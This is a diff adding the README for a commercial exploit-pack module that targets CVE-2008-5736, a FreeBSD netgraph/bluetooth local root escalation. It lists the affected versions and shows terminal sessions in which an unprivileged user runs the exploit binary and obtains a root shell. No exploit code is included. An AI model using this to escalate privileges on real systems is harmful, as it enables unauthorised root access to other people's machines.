@@ -1,0 +1,71 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Vulnerability description:
+---------------------------
+
+FreeBSD netgraph and bluetooth Local Privilege Escalation
+Vulnerabilities
+
+CVE Name:		 CVE-2008-5736
+Remote:		   No
+Local:		   Yes
+Published: 	 Dec 23 2008 12:00AM
+Updated: 	   Dec 31 2008 01:21AM
+Credit: 	   Christer Oberg
+Vulnerable: 	FreeBSD 7.1 -PRE-RELEASE
+		FreeBSD 7.0-RELEASE
+		FreeBSD 7.0 -RELENG
+		FreeBSD 7.0
+		FreeBSD 6.4 -RELEASE
+		FreeBSD 6.3 -RELENG
+		FreeBSD 6.3
+Tested:      Freebsd 6.3 x86 and 7.0 x86
+
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5736
+
+Exploit
+--------
+
+$ id
+uid=1001(pouet) gid=1001(pouet) groups=1001(pouet)
+$ kldstat ; id
+Id Refs Address    Size     Name
+ 1    9 0xc0400000 7a05b0   kernel
+ 2    1 0xc0ba1000 5c304    acpi.ko
+ 3    1 0xc1b4b000 19000    linux.ko
+ 4    2 0xc25a6000 a000     netgraph.ko
+ 5    1 0xc2512000 4000     ng_socket.ko
+uid=1001(pouet) gid=1001(pouet) groups=1001(pouet)
+$ ./d2sec_netgraph
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel),1001(pouet)
+# uname -a
+FreeBSD fbsd.localdomain 6.3-RELEASE FreeBSD 6.3-RELEASE #0: Wed Jan 16 04:18:52 UTC 2008     root@dessler.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
+#
+
+$ kldstat
+Id Refs Address    Size     Name
+ 1    9 0xc0400000 906518   kernel
+ 2    1 0xc0d07000 6a32c    acpi.ko
+ 3    1 0xc1d9a000 22000    linux.ko
+ 4    1 0xc1ef4000 4000     ng_socket.ko
+ 5    1 0xc1ef8000 b000     netgraph.ko
+$ id
+uid=1001(pouet) gid=1001(pouet) groups=1001(pouet),0(wheel)
+$ ./d2sec_netgraph                        
+# id
+uid=0(root) gid=0(wheel) egid=1001(pouet) groups=1001(pouet),0(wheel)
+# uname -a
+FreeBSD freebsd-70-x86.localdomain 7.0-RELEASE FreeBSD 7.0-RELEASE #0: Sun Feb 24 19:59:52 UTC 2008     root@logan.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
+
